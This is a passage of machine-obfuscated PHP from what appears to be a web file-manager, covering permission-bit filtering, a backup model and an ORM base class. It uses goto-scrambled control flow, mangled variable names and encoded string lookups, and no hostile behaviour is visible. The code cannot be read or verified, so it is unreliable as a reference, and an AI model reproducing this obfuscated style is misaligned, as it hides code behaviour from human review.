$fÑÒ§£¼™Ú[400] => 1, $fÑÒ§£¼™Ú[1695] => $fÑÒ§£¼™Ú[1684], $fÑÒ§£¼™Ú[1696] => 1, $fÑÒ§£¼™Ú[1151] => 0, $fÑÒ§£¼™Ú[1697] => 0); goto BˆñÈµÜİ; D¢åí®“Ş: return parent::insert($E‰‚äÉ„È); goto B„—¦¥¬”; BˆñÈµÜİ: $E‰‚äÉ„È = array_merge($FñË„Í¸‰, $E‰‚äÉ„È); $E‰‚äÉ„È[$fÑÒ§£¼™Ú[1697]] = $this->getSort(); $this->filterAuth($E‰‚äÉ„È[$fÑÒ§£¼™Ú[400]]); goto D¢åí®“Ş; B„—¦¥¬”: } private function getSort() { $D³ÏÔ…›â =& $_SERVER[ÉóçÄÇ]; $FĞ´¼ÈêëÁ = parent::listData(); $AÂ´á¢ñøÈ = array_to_keyvalue($FĞ´¼ÈêëÁ, $D³ÏÔ…›â[33], $D³ÏÔ…›â[1697]); return empty($AÂ´á¢ñøÈ) ? 0 : max($AÂ´á¢ñøÈ) + 1; } private function filterAuth(&$EÎ÷ŒÀÎö…) { goto fĞ¿àÆ†Ã; eä¾—Øòİ: foreach ($DØä™»Ç as $Fñ†ƒêÂ) { if (isset($bÏØÅäÁÚ[$Fñ†ƒêÂ])) { $DØä™»Ç = array_merge($DØä™»Ç, $bÏØÅäÁÚ[$Fñ†ƒêÂ]); } } $DØä™»Ç[] = self::AUTH_SHOW; $EÎ÷ŒÀÎö… = array_sum(array_unique($DØä™»Ç)); goto FÒ´ëšó¿í; cÄÎ›Òƒª¨: foreach ($E À…è¦Š‰ as $Fñ†ƒêÂ) { if ($EÎ÷ŒÀÎö… & $Fñ†ƒêÂ) { $DØä™»Ç[] = $Fñ†ƒêÂ; } } if (in_array(self::AUTH_ROOT, $DØä™»Ç)) { $EÎ÷ŒÀÎö… = array_sum($E À…è¦Š‰); return; } $bÏØÅäÁÚ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto eä¾—Øòİ; fĞ¿àÆ†Ã: if (!$EÎ÷ŒÀÎö…) { return; } $E À…è¦Š‰ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $DØä™»Ç = array(); goto cÄÎ›Òƒª¨; FÒ´ëšó¿í: } public function sort($fÃÌ ËĞĞ³, $Bìç©ØÁÕ) { return parent::update($fÃÌ ËĞĞ³, $Bìç©ØÁÕ); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\155\56\x62\141\x63\x6b\165\160\114\x69\163\164"; public $field = array("\x69\x6f", "\x6e\x61\155\x65", "\x73\164\141\x74\165\x73", "\x63\157\x6e\164\145\x6e\164", "\162\145\x73\x75\x6c\x74", "\164\x69\155\145\106\x72\157\155", "\x74\151\155\x65\x54\x6f"); public function config() { goto fª³÷Ê°®—; fª³÷Ê°®—: $D‘ëÉÒçŒ =& $_SERVER[ÉóçÄÇ]; $a‰™‰¦¿‹Ó = Model($D‘ëÉÒçŒ[1106])->get($D‘ëÉÒçŒ[735]); $a‰™‰¦¿‹Ó = json_decode($a‰™‰¦¿‹Ó, !0); goto c‹ç ˆŒ¸; c‹ç ˆŒ¸: $a‰™‰¦¿‹Ó = is_array($a‰™‰¦¿‹Ó) ? $a‰™‰¦¿‹Ó : array(); if (!isset($a‰™‰¦¿‹Ó[$D‘ëÉÒçŒ[714]])) { $a‰™‰¦¿‹Ó[$D‘ëÉÒçŒ[714]] = $D‘ëÉÒçŒ[86]; } $c¤öÓöŒÒî = array(); goto A’‘ÆõÈÆ’; A’‘ÆõÈÆ’: Action($D‘ëÉÒçŒ[1698])->taskInit(); $C´˜“¸‡âº = Model($D‘ëÉÒçŒ[1699])->listData(); foreach ($C´˜“¸‡âº as $a­Æ¼ÏËõ¯) { if ($a­Æ¼ÏËõ¯[$D‘ëÉÒçŒ[1151]] == $D‘ëÉÒçŒ[86] && $a­Æ¼ÏËõ¯[$D‘ëÉÒçŒ[1500]] == $D‘ëÉÒçŒ[1700]) { $c¤öÓöŒÒî = $a­Æ¼ÏËõ¯; break; } } goto cºñæ¡ô±Æ; cºñæ¡ô±Æ: if (isset($c¤öÓöŒÒî[$D‘ëÉÒçŒ[195]])) { $c¤öÓöŒÒî[$D‘ëÉÒçŒ[195]] = json_decode($c¤öÓöŒÒî[$D‘ëÉÒçŒ[195]], !0); } if (isset($a‰™‰¦¿‹Ó[$D‘ëÉÒçŒ[195]])) { $c¤öÓöŒÒî[$D‘ëÉÒçŒ[195]][$D‘ëÉÒçŒ[1485]] = $a‰™‰¦¿‹Ó[$D‘ëÉÒçŒ[195]]; unset($a‰™‰¦¿‹Ó[$D‘ëÉÒçŒ[195]]); } return array_merge($c¤öÓöŒÒî, $a‰™‰¦¿‹Ó); goto BÕÍ¥‘ˆÖ†; BÕÍ¥‘ˆÖ†: } public function listData($Dô¸îàˆèÆ = false, $cë¬ğË‘¦² = "\155\x6f\x64\x69\x66\x79\124\151\x6d\x65", $EæÉÔÅ¶¶ = false) { return parent::listData($Dô¸îàˆèÆ, $cë¬ğË‘¦², !0); } public function lastItem() { $EæÂ¿îò­¡ = $this->listData(); return !empty($EæÂ¿îò­¡[0]) ? $EæÂ¿îò­¡[0] : null; } public function kill($aÊ–‰œÀè²) { goto bœª¶Â±¡; dÌÑÄ†ÆÓÊ: $AÃ³»öª“  = $bÀ×Îİª‚[$fµ¶£Á‘õ[28]]; $D¢¯¤ë™ä = TEMP_FILES . $fµ¶£Á‘õ[731] . $AÃ³»öª“  . $fµ¶£Á‘õ[8]; IO::remove($D¢¯¤ë™ä, !1); goto c§å•¹’¸ç; bœª¶Â±¡: $fµ¶£Á‘õ =& $_SERVER[ÉóçÄÇ]; $bÀ×Îİª‚ = $this->listData($aÊ–‰œÀè²); if (!$bÀ×Îİª‚ || empty($bÀ×Îİª‚[$fµ¶£Á‘õ[28]])) { return !0; } goto Eå£¸Èä±; Eå£¸Èä±: Task::kill($fµ¶£Á‘õ[734]); Task::kill($fµ¶£Á‘õ[753]); Task::kill($fµ¶£Á‘õ[762]); goto dÌÑÄ†ÆÓÊ; c§å•¹’¸ç: return $this->remove($aÊ–‰œÀè²); goto a±µ—Ÿ÷ØÊ; a±µ—Ÿ÷ØÊ: } public function remove($E³‹•Õù´Î) { $cñ­…š›  = $this->listData($E³‹•Õù´Î); if (!$cñ­…š› ) { return !0; } return $this->backupRemove($cñ­…š› ); } private function backupRemove($cååÍöÀËš) { $bñä°…ª— =& $_SERVER[ÉóçÄÇ]; parent::remove($cååÍöÀËš[$bñä°…ª—[388]]); $cİŞôÏñÀÏ = "\173\151\x6f\72{$cååÍöÀËš[$bñä°…ª—[713]]}\175\x2f\144\141\x74\141\x62\x61\x73\145\57\142\x61\x63\153\x75\x70\137" . $cååÍöÀËš[$bñä°…ª—[28]]; IO::remove($cİŞôÏñÀÏ, !1); return !0; } public function start() { goto c†ä¬é‚Ó; Eªğ¶ÉÃ µ: if ($fÖçÊ›¨š) { $fÖçÊ›¨š = $fê½Ş÷…Ç¯->dbFile(); if ($fÖçÊ›¨š && $AÎËË ÓÕ®[$cƒğ½šĞ[714]] == $cƒğ½šĞ[491]) { $fÖçÊ›¨š = $fê½Ş÷…Ç¯->file(); } } Backup::set(array($cƒğ½šĞ[711] => 1, $cƒğ½šĞ[470] => time())); return !0; goto Dä¦¢µïã¦; c†ä¬é‚Ó: $cƒğ½šĞ =& $_SERVER[ÉóçÄÇ]; if ($GLOBALS[$cƒğ½šĞ[6]][$cƒğ½šĞ[87]][$cƒğ½šĞ[1701]] != $cƒğ½šĞ[86]) { return !0; } $AÎËË ÓÕ® = $this->config(); goto A¥¨İŸêà; A¥¨İŸêà: if (!$AÎËË ÓÕ® || $AÎËË ÓÕ®[$cƒğ½šĞ[1482]] != $cƒğ½šĞ[86]) { return !1; } $Eƒ©ë‚¾‚ = $this->process(); foreach ($Eƒ©ë‚¾‚ as $B½¥šğ’¸ë) { if ($B½¥šğ’¸ë) { return Task::restart($B½¥šğ’¸ë[$cƒğ½šĞ[388]]); } } goto dµ„Óóİ£¾; dµ„Óóİ£¾: $fê½Ş÷…Ç¯ = new Backup(); $fê½Ş÷…Ç¯->keep(); $fÖçÊ›¨š = $fê½Ş÷…Ç¯->db(); goto Eªğ¶ÉÃ µ; Dä¦¢µïã¦: } public function process() { $F”‡‚˜ƒÙ =& $_SERVER[ÉóçÄÇ]; return array($F”‡‚˜ƒÙ[716] => Task::get($F”‡‚˜ƒÙ[734]), $F”‡‚˜ƒÙ[719] => Task::get($F”‡‚˜ƒÙ[753]), $F”‡‚˜ƒÙ[173] => Task::get($F”‡‚˜ƒÙ[762])); } public function restore() { $F—«÷£‘‰‚ =& $_SERVER[ÉóçÄÇ]; ActionCall($F—«÷£‘‰‚[1001], !0, 1); ActionCall($F—«÷£‘‰‚[1001], !0, 0); } } goto D­ÍÀ„­á; Cà¢¾ÏµƒÕ: define($_SERVER[ÉóçÄÇ][238], 0); define($_SERVER[ÉóçÄÇ][239], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\x62\x6c\145", "\157\x72\x64\145\162", "\141\154\151\x61\163", "\x68\141\166\x69\156\x67", "\x67\x72\x6f\x75\160", "\x6c\x6f\143\153", "\144\x69\163\x74\151\156\x63\164", "\x61\x75\164\157", "\x66\x69\x6c\164\145\162", "\x76\141\x6c\x69\144\141\x74\145", "\162\145\x73\x75\154\164", "\x62\x69\156\x64", "\x74\x6f\x6b\145\x6e"); public function __construct($E–¾Ûñ” Ê = '', $C²ùİ¡Ôõ = '', $dá‹©¦æ¯‹ = '') { $c—÷ìƒãö— =& $_SERVER[ÉóçÄÇ]; $this->_initialize(); if (!empty($E–¾Ûñ” Ê)) { if (strpos($E–¾Ûñ” Ê, $c—÷ìƒãö—[94])) { list($this->dbName, $this->name) = explode($c—÷ìƒãö—[94], $E–¾Ûñ” Ê); } else { $this->name = $E–¾Ûñ” Ê; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($C²ùİ¡Ôõ)) { $this->tablePrefix = $c—÷ìƒãö—[33]; } elseif ($c—÷ìƒãö—[33] != $C²ùİ¡Ôõ) { $this->tablePrefix = $C²ùİ¡Ôõ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($c—÷ìƒãö—[240]); } $this->db(0, empty($this->connection) ? $dá‹©¦æ¯‹ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $f–÷Ôä•‘É =& $_SERVER[ÉóçÄÇ]; if (empty($this->fields)) { if (think_config($f–÷Ôä•‘É[241])) { $cÃã¨Ÿè³Ù = $this->dbName ? $this->dbName : think_config($f–÷Ôä•‘É[242]); $Dï‘À¢ÆÅ = think_var_cache($f–÷Ôä•‘É[243] . strtolower(get_path_this($cÃã¨Ÿè³Ù) . $f–÷Ôä•‘É[94] . $this->name)); if ($Dï‘À¢ÆÅ) { $f”ÀŠ²Ÿõç = think_config($f–÷Ôä•‘É[244]); if (empty($f”ÀŠ²Ÿõç) || $Dï‘À¢ÆÅ[$f–÷Ôä•‘É[245]] == $f”ÀŠ²Ÿõç) { $this->fields = $Dï‘À¢ÆÅ; return; } } } $this->flush(); } } public function flush() { goto AˆÎ¿„Ü¦½; AˆÎ¿„Ü¦½: $F®Åİó¾†ö =& $_SERVER[ÉóçÄÇ]; $this->db->setModel($this->name); $Fè†µ…Á  = $this->db->getFields($this->getTableName()); goto fí³™êÃ‘¥; fí³™êÃ‘¥: if (!$Fè†µ…Á ) { return !1; } $this->fields = array_keys($Fè†µ…Á ); $this->fields[$F®Åİó¾†ö[246]] = !1; goto eìÃÀ‹¢æÉ; FîùÛÒ¦ƒª: if (think_config($F®Åİó¾†ö[241])) { $A¸¼¼›’Â¿ = $this->dbName ? $this->dbName : think_config($F®Åİó¾†ö[242]); think_var_cache($F®Åİó¾†ö[243] . strtolower(get_path_this($A¸¼¼›’Â¿) . $F®Åİó¾†ö[94] . $this->name), $this->fields); } goto fÇ¶°õå; eìÃÀ‹¢æÉ: foreach ($Fè†µ…Á  as $CÎœºˆñÖÛ => $Fê¯ÇÏŸ›í) { $eÕŒ¢é˜¬[$CÎœºˆñÖÛ] = $Fê¯ÇÏŸ›í[$F®Åİó¾†ö[29]]; if ($Fê¯ÇÏŸ›í[$F®Åİó¾†ö[36]]) { $this->fields[$F®Åİó¾†ö[247]] = $CÎœºˆñÖÛ; if ($Fê¯ÇÏŸ›í[$F®Åİó¾†ö[39]]) { $this->fields[$F®Åİó¾†ö[246]] = !0; } } } $this->fields[$F®Åİó¾†ö[248]] = $eÕŒ¢é˜¬; if (think_config($F®Åİó¾†ö[244])) { $this->fields[$F®Åİó¾†ö[245]] = think_config($F®Åİó¾†ö[244]); } goto FîùÛÒ¦ƒª; fÇ¶°õå: } public function switchModel($fİÔ„Ë‘ ù, $b–È…ÛÈÓ = array()) { $bİ­õÀ¼”¹ =& $_SERVER[ÉóçÄÇ]; $B‚±„Û÷æ… = ucwords(strtolower($fİÔ„Ë‘ ù)) . $bİ­õÀ¼”¹[249]; if (!class_exists($B‚±„Û÷æ…)) { think_exception($B‚±„Û÷æ… . think_lang($bİ­õÀ¼”¹[250])); } $this->_extModel = new $B‚±„Û÷æ…($this->name); if (!empty($b–È…ÛÈÓ)) { foreach ($b–È…ÛÈÓ as $Dœœ®ÇÃÓš) { $this->_extModel->setProperty($Dœœ®ÇÃÓš, $this->{$Dœœ®ÇÃÓš}); } } return $this->_extModel; } public function __set($B£´¯É©½‚, $bãè¶‹¦”Ğ) { $this->data[$B£´¯É©½‚] = $bãè¶‹¦”Ğ; } public function __get($Fİè´ÑŞÀÓ) { return isset($this->data[$Fİè´ÑŞÀÓ]) ? $this->data[$Fİè´ÑŞÀÓ] : null; } public function __isset($fªÆÆ¢ÚŒó) { return isset($this->data[$fªÆÆ¢ÚŒó]); } public function __unset($A½›é…¡é™) { unset($this->data[$A½›é…¡é™]); } public function __call($dˆœêƒÄ®Ò, $C¯‘ªéÀÑÆ) { $dæ¾ˆäš¯È =& $_SERVER[ÉóçÄÇ]; if (in_array(strtolower($dˆœêƒÄ®Ò), $this->methods, !0)) { $this->options[strtolower($dˆœêƒÄ®Ò)] = $C¯‘ªéÀÑÆ[0]; return $this; } elseif (in_array(strtolower($dˆœêƒÄ®Ò), array($dæ¾ˆäš¯È[251], $dæ¾ˆäš¯È[252], $dæ¾ˆäš¯È[253], $dæ¾ˆäš¯È[254], $dæ¾ˆäš¯È[255]), !0)) { $cäÍ—÷ø¬ = isset($C¯‘ªéÀÑÆ[0]) ? $C¯‘ªéÀÑÆ[0] : $dæ¾ˆäš¯È[182]; $cäÍ—÷ø¬ = $this->db->parseKey($cäÍ—÷ø¬); return $this->getField(strtoupper($dˆœêƒÄ®Ò) . $dæ¾ˆäš¯È[256] . $cäÍ—÷ø¬ . $dæ¾ˆäš¯È[257] . $dˆœêƒÄ®Ò, $dæ¾ˆäš¯È[251]); } elseif (strtolower(substr($dˆœêƒÄ®Ò, 0, 5)) == $dæ¾ˆäš¯È[258]) { $cäÍ—÷ø¬ = think_parse_name(substr($dˆœêƒÄ®Ò, 5)); $EŒÊ–ïˆ–´[$cäÍ—÷ø¬] = $C¯‘ªéÀÑÆ[0]; return $this->where($EŒÊ–ïˆ–´)->find(); } elseif (strtolower(substr($dˆœêƒÄ®Ò, 0, 10)) == $dæ¾ˆäš¯È[259]) { $a÷–…Ê÷Š¦ = think_parse_name(substr($dˆœêƒÄ®Ò, 10)); $EŒÊ–ïˆ–´[$a÷–…Ê÷Š¦] = $C¯‘ªéÀÑÆ[0]; return $this->where($EŒÊ–ïˆ–´)->getField($C¯‘ªéÀÑÆ[1]); } elseif (isset($this->_scope[$dˆœêƒÄ®Ò])) { return $this->scope($dˆœêƒÄ®Ò, $C¯‘ªéÀÑÆ[0]); } elseif (method_exists($this, $dˆœêƒÄ®Ò)) { array_unshift($C¯‘ªéÀÑÆ, $dˆœêƒÄ®Ò); return call_user_func_array(array($this, $dæ¾ˆäš¯È[260]), $C¯‘ªéÀÑÆ); } else { return call_user_func_array(array(parent, $dˆœêƒÄ®Ò), $C¯‘ªéÀÑÆ); } } protected function call() { goto Cé•“£Ùå“; FŠ•êŒ×ˆ´: $fÀ¤œìÆÆê = $d¯ƒ¡÷Ó‘; if (is_array($d¯ƒ¡÷Ó‘)) { $fÀ¤œìÆÆê = $d¯ƒ¡÷Ó‘[1]; $d¯ƒ¡÷Ó‘ = $d¯ƒ¡÷Ó‘[0]; } $EÓÖ°ßÖ× = count($aÖİ¨íÄÓ) - 1; goto a‡µÄ¯Ö; a‡µÄ¯Ö: if (isset($aÖİ¨íÄÓ[$EÓÖ°ßÖ×]) && $aÖİ¨íÄÓ[$EÓÖ°ßÖ×] === $d¯ƒ¡÷Ó‘) { think_exception(__CLASS__ . $F§ºõëÒ´[4] . $d¯ƒ¡÷Ó‘ . think_lang($F§ºõëÒ´[261])); return; } $aÖİ¨íÄÓ[] = $d¯ƒ¡÷Ó‘; if (method_exists($this, $F§ºõëÒ´[262])) { $AËÙÅˆí¨— = call_user_func_array(array($this, $F§ºõëÒ´[263]), array($fÀ¤œìÆÆê, $aÖİ¨íÄÓ)); if (!is_null($AËÙÅˆí¨—) && $AËÙÅˆí¨— !== !1) { return $AËÙÅˆí¨—; } } goto bÂ…˜ÎÎ“½; bÂ…˜ÎÎ“½: $CÖ²Ó­›ù½ = call_user_func_array(array($this, $d¯ƒ¡÷Ó‘), $aÖİ¨íÄÓ); if (method_exists($this, $F§ºõëÒ´[264])) { $AËÙÅˆí¨— = call_user_func_array(array($this, $F§ºõëÒ´[265]), array($fÀ¤œìÆÆê, $aÖİ¨íÄÓ, $CÖ²Ó­›ù½)); if ($AËÙÅˆí¨—) { return $AËÙÅˆí¨—; } } return $CÖ²Ó­›ù½; goto c°‹œ†‘²Å; Cé•“£Ùå“: $F§ºõëÒ´ =& $_SERVER[ÉóçÄÇ]; $aÖİ¨íÄÓ = func_get_args(); $d¯ƒ¡÷Ó‘ = array_shift($aÖİ¨íÄÓ); goto FŠ•êŒ×ˆ´; c°‹œ†‘²Å: } protected function _initialize() { } protected function _facade($eÔ–„ø•Ë) { $CòÂğ£Ä¼â =& $_SERVER[ÉóçÄÇ]; if (!empty($this->fields)) { foreach ($eÔ–„ø•Ë as $C¦òÊØØÇ => $Fƒ§¢é‹) { if (is_array($this->fields) && !in_array($C¦òÊØØÇ, $this->fields, !0)) { unset($eÔ–„ø•Ë[$C¦òÊØØÇ]); } elseif (is_scalar($Fƒ§¢é‹)) { $this->_parseType($eÔ–„ø•Ë, $C¦òÊØØÇ); } } } if (!empty($this->options[$CòÂğ£Ä¼â[266]])) { $eÔ–„ø•Ë = array_map($this->options[$CòÂğ£Ä¼â[266]], $eÔ–„ø•Ë); unset($this->options[$CòÂğ£Ä¼â[266]]); } $this->_beforeWrite($eÔ–„ø•Ë); return $eÔ–„ø•Ë; } protected function _beforeWrite(&$CŒ¡¬šÕ‚ß) { } public function add($FÈ›éíÃİŸ = '', $fñ©çËÁç­ = array(), $F¡É¶ùŠÆ× = false) { goto E‹‰ö¼à•; C½·ëßÜˆˆ: return $E‘âÅª‹Û–; goto E½ç®êğ; Cš¿ÎÇŸ˜—: if (!1 === $this->_beforeInsert($FÈ›éíÃİŸ, $fñ©çËÁç­)) { return !1; } $E‘âÅª‹Û– = $this->db->insert($FÈ›éíÃİŸ, $fñ©çËÁç­, $F¡É¶ùŠÆ×); if (!1 !== $E‘âÅª‹Û–) { $eÑ™‘¨±éĞ = $this->getLastInsID(); if ($eÑ™‘¨±éĞ) { $FÈ›éíÃİŸ[$this->getPk()] = $eÑ™‘¨±éĞ; $this->_after_insert($FÈ›éíÃİŸ, $fñ©çËÁç­); return $eÑ™‘¨±éĞ; } $this->_after_insert($FÈ›éíÃİŸ, $fñ©çËÁç­); } goto C½·ëßÜˆˆ; E‹‰ö¼à•: if (empty($FÈ›éíÃİŸ)) { if (!empty($this->data)) { $FÈ›éíÃİŸ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ÉóçÄÇ][267]); return !1; } } $fñ©çËÁç­ = $this->_parseOptions($fñ©çËÁç­); $FÈ›éíÃİŸ = $this->_facade($FÈ›éíÃİŸ); goto Cš¿ÎÇŸ˜—; E½ç®êğ: } protected function _beforeInsert(&$Bô²µŠëÕó, $Cì•ÛçÏŸé) { } protected function _after_insert($fÉÀÄœñÉ», $F¦ÁŠÉ¶À×) { } public function addAll($e¾èäƒ…… , $f‰©õ†—ŸÊ = array(), $FÈ¶ˆ™„®Ô = false) { goto FËñ×Œ¡š; fø¥ËŸ¥‘‰: foreach ($e¾èäƒ……  as $dÎ‚ïÁ¯ã¯ => $a°‘²ÈËÕå) { $e¾èäƒ…… [$dÎ‚ïÁ¯ã¯] = $this->_facade($a°‘²ÈËÕå); } if (method_exists($this->db, $FÑÈÙ¸Î[268])) { $e›Ü¹©ä­º = $this->db->insertAll($e¾èäƒ…… , $f‰©õ†—ŸÊ, $FÈ¶ˆ™„®Ô); } else { $this->startTrans(); foreach ($e¾èäƒ……  as $dÎ‚ïÁ¯ã¯ => $a°‘²ÈËÕå) { $e›Ü¹©ä­º = $this->db->insert($a°‘²ÈËÕå, $f‰©õ†—ŸÊ, $FÈ¶ˆ™„®Ô); } $this->commit(); } if (!1 !== $e›Ü¹©ä­º) { $cƒÔÆàßÈä = $this->getLastInsID(); if ($cƒÔÆàßÈä) { return $cƒÔÆàßÈä; } } goto cÂ÷ğš•©‚; FËñ×Œ¡š: $FÑÈÙ¸Î =& $_SERVER[ÉóçÄÇ]; if (empty($e¾èäƒ…… )) { $this->error = think_lang($FÑÈÙ¸Î[267]); return !1; } $f‰©õ†—ŸÊ = $this->_parseOptions($f‰©õ†—ŸÊ); goto fø¥ËŸ¥‘‰; cÂ÷ğš•©‚: return $e›Ü¹©ä­º; goto b„ÛßÁŒŒŒ; b„ÛßÁŒŒŒ: } public function selectAdd($C±»éĞ¶Ú¨ = '', $bœç½õŒØ‰ = '', $BïÕÉßÔ»“ = array()) { $f»´§ËÑß =& $_SERVER[ÉóçÄÇ]; $BïÕÉßÔ»“ = $this->_parseOptions($BïÕÉßÔ»“); if (!1 === ($FÔâÑÛ = $this->db->selectInsert($C±»éĞ¶Ú¨ ? $C±»éĞ¶Ú¨ : $BïÕÉßÔ»“[$f»´§ËÑß[269]], $bœç½õŒØ‰ ? $bœç½õŒØ‰ : $this->getTableName(), $BïÕÉßÔ»“))) { $this->error = think_lang($f»´§ËÑß[270]); return !1; } else { return $FÔâÑÛ; } } public function save($FÈ£ˆêºñ‘ = '', $Cõ÷ÍáÑˆé = array()) { goto C´òß¬» ß; C´òß¬» ß: $C´Æ’õÂ =& $_SERVER[ÉóçÄÇ]; if (empty($FÈ£ˆêºñ‘)) { if (!empty($this->data)) { $FÈ£ˆêºñ‘ = $this->data; $this->data = array(); } else { $this->error = think_lang($C´Æ’õÂ[267]); return !1; } } $FÈ£ˆêºñ‘ = $this->_facade($FÈ£ˆêºñ‘); goto e´·Í„’·; aºã„‹²ô: if (!1 !== $Böë‚Ôãçæ) { if (isset($AØêè‘’˜§)) { $FÈ£ˆêºñ‘[$C¢«©È““Û] = $AØêè‘’˜§; } $this->_afterUpdate($FÈ£ˆêºñ‘, $Cõ÷ÍáÑˆé); } return $Böë‚Ôãçæ; goto B«ËÓ‡ÊÅ¸; e´·Í„’·: $Cõ÷ÍáÑˆé = $this->_parseOptions($Cõ÷ÍáÑˆé); $C¢«©È““Û = $this->getPk(); if (!isset($Cõ÷ÍáÑˆé[$C´Æ’õÂ[271]])) { if (isset($FÈ£ˆêºñ‘[$C¢«©È““Û])) { $eŒ¨«§¯‹Ê[$C¢«©È““Û] = $FÈ£ˆêºñ‘[$C¢«©È““Û]; $Cõ÷ÍáÑˆé[$C´Æ’õÂ[271]] = $eŒ¨«§¯‹Ê; unset($FÈ£ˆêºñ‘[$C¢«©È““Û]); } else { $this->error = think_lang($C´Æ’õÂ[270]); return !1; } } goto A¹„ÏŠîó¬; A¹„ÏŠîó¬: if (is_array($Cõ÷ÍáÑˆé[$C´Æ’õÂ[271]]) && isset($Cõ÷ÍáÑˆé[$C´Æ’õÂ[271]][$C¢«©È““Û])) { $AØêè‘’˜§ = $Cõ÷ÍáÑˆé[$C´Æ’õÂ[271]][$C¢«©È““Û]; } if (!1 === $this->_beforeUpdate($FÈ£ˆêºñ‘, $Cõ÷ÍáÑˆé)) { return !1; } $Böë‚Ôãçæ = $this->db->update($FÈ£ˆêºñ‘, $Cõ÷ÍáÑˆé); goto aºã„‹²ô; B«ËÓ‡ÊÅ¸: } protected function _beforeUpdate(&$A¼Åã¤êêƒ, $C‡óÀº²”¨) { } protected function _afterUpdate($DïßèÔ‰à¹, $EÖ‹®ëÕ†) { } public function delete($fîƒ¬ØÖ®ø = array()) { goto Bˆï÷·İ´Ò; aœ›ÌÅôĞø: $b’œ¸‚¶ÖŠ = $this->db->delete($fîƒ¬ØÖ®ø); if (!1 !== $b’œ¸‚¶ÖŠ) { $e‹§è¼Ì–‚ = array(); if (isset($f°µ£…äáƒ)) { $e‹§è¼Ì–‚[$BÔã¾äíø] = $f°µ£…äáƒ; } $this->_after_delete($e‹§è¼Ì–‚, $fîƒ¬ØÖ®ø); } return $b’œ¸‚¶ÖŠ; goto EÈŒ‚›Æõç; Bˆï÷·İ´Ò: $D•‹×Á¨Å‰ =& $_SERVER[ÉóçÄÇ]; if (empty($fîƒ¬ØÖ®ø) && empty($this->options[$D•‹×Á¨Å‰[271]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $BÔã¾äíø = $this->getPk(); goto BˆæéÛ¦†Š; BˆæéÛ¦†Š: if (is_numeric($fîƒ¬ØÖ®ø) || is_string($fîƒ¬ØÖ®ø)) { if (strpos($fîƒ¬ØÖ®ø, $D•‹×Á¨Å‰[47])) { $Bòö“îï[$BÔã¾äíø] = array($D•‹×Á¨Å‰[272], $fîƒ¬ØÖ®ø); } else { $Bòö“îï[$BÔã¾äíø] = $fîƒ¬ØÖ®ø; } $this->options[$D•‹×Á¨Å‰[271]] = $Bòö“îï; } $fîƒ¬ØÖ®ø = $this->_parseOptions(); if (is_array($fîƒ¬ØÖ®ø[$D•‹×Á¨Å‰[271]]) && isset($fîƒ¬ØÖ®ø[$D•‹×Á¨Å‰[271]][$BÔã¾äíø])) { $f°µ£…äáƒ = $fîƒ¬ØÖ®ø[$D•‹×Á¨Å‰[271]][$BÔã¾äíø]; } goto aœ›ÌÅôĞø; EÈŒ‚›Æõç: } protected function _after_delete($bÖ¼õÓù, $aŒçìŞ¶¯Ù) { } public function select($F¼í¿‡â¦™ = array()) { goto cÇÕ“ÒÊŸ; f¿÷¡¶ è¦: $c­‹…Š– = $this->db->select($F¼í¿‡â¦™); if (!1 === $c­‹…Š–) { return !1; } if (empty($c­‹…Š–)) { return null; } goto b”¼ÓˆĞ‰¹; b”¼ÓˆĞ‰¹: $this->_afterSelect($c­‹…Š–, $F¼í¿‡â¦™); return $c­‹…Š–; goto AæÄßŠ°²; cÇÕ“ÒÊŸ: $e¤Ø¨ì’ä÷ =& $_SERVER[ÉóçÄÇ]; if (is_string($F¼í¿‡â¦™) || is_numeric($F¼í¿‡â¦™)) { $C—èäŠ·©† = $this->getPk(); if (strpos($F¼í¿‡â¦™, $e¤Ø¨ì’ä÷[47])) { $DÚ­µçµ“é[$C—èäŠ·©†] = array($e¤Ø¨ì’ä÷[272], $F¼í¿‡â¦™); } else { $DÚ­µçµ“é[$C—èäŠ·©†] = $F¼í¿‡â¦™; } $this->options[$e¤Ø¨ì’ä÷[271]] = $DÚ­µçµ“é; } elseif (!1 === $F¼í¿‡â¦™) { $F¼í¿‡â¦™ = $this->_parseOptions(); return $e¤Ø¨ì’ä÷[273] . $this->db->buildSelectSql($F¼í¿‡â¦™) . $e¤Ø¨ì’ä÷[274]; } $F¼í¿‡â¦™ = $this->_parseOptions(); goto f¿÷¡¶ è¦; AæÄßŠ°²: } protected function _afterSelect(&$fà×Ã®¢œé, $CÁ³°¥—Á¯) { } public function buildSql($fšŒ­³ã† = array()) { $E¶©…¤¸³¢ =& $_SERVER[ÉóçÄÇ]; $fšŒ­³ã† = $this->_parseOptions($fšŒ­³ã†); return $E¶©…¤¸³¢[273] . $this->db->buildSelectSql($fšŒ­³ã†) . $E¶©…¤¸³¢[274]; } public function optionsValue($cïôÄˆÏ«² = null) { if (is_null($cïôÄˆÏ«²)) { return $this->options; } elseif (is_array($cïôÄˆÏ«²)) { $this->options = array_merge($this->options, $cïôÄˆÏ«²); } } protected function _parseOptions($CÒƒ§½ŠÇ = array()) { goto BŒ»Î§Ë; A¨è£½“½: if (!isset($CÒƒ§½ŠÇ[$FÔºôÅƒôÀ[275]])) { 